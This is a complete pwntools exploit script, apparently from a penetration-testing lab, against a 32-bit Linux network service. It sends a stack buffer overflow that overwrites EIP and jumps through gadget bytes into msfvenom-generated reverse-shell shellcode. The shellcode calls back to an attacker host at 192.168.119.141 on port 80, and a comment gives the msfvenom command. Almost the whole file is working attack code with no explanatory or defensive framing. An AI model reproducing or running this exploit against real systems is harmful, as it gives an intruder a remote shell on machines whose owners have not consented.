#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or '192.168.141.44'
port = int(args.PORT or 13327)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

eip = '\x96\x45\x13\x08'
addeax = '\x83\xc0\x0c'
jmpeax = '\xff\xe0'

# badchars: 00, 20
# msfvenom --arch x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=192.168.119.141 LPORT=80 -b '\x00\x20' -f python
buf =  "\x90" * 32
buf += "\xd9\xcd\xb8\x0c\xba\xf6\x28\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x12\x31\x43\x17\x03\x43\x17\x83\xe7\x46\x14"
buf += "\xdd\xc6\x6d\x2e\xfd\x7b\xd1\x82\x68\x79\x5c\xc5\xdd"
buf += "\x1b\x93\x86\x8d\xba\x9b\xb8\x7c\xbc\x95\xbf\x87\xd4"
buf += "\xe5\xe8\x0f\xa9\x8e\xea\xef\xb1\x1e\x62\x0e\x01\xf8"
buf += "\x24\x80\x32\xb6\xc6\xab\x55\x75\x48\xf9\xfd\xe8\x66"
buf += "\x8d\x95\x9c\x57\x5e\x07\x34\x21\x43\x95\x95\xb8\x65"
buf += "\xa9\x11\x76\xe5"

io = start()

io.sendline('\x11(setup sound ' + buf + 'A' * (4368-len(buf)) + eip + addeax + jmpeax + '\x90' * 2 + '\x90\x00#')

info(io.recv(1024))
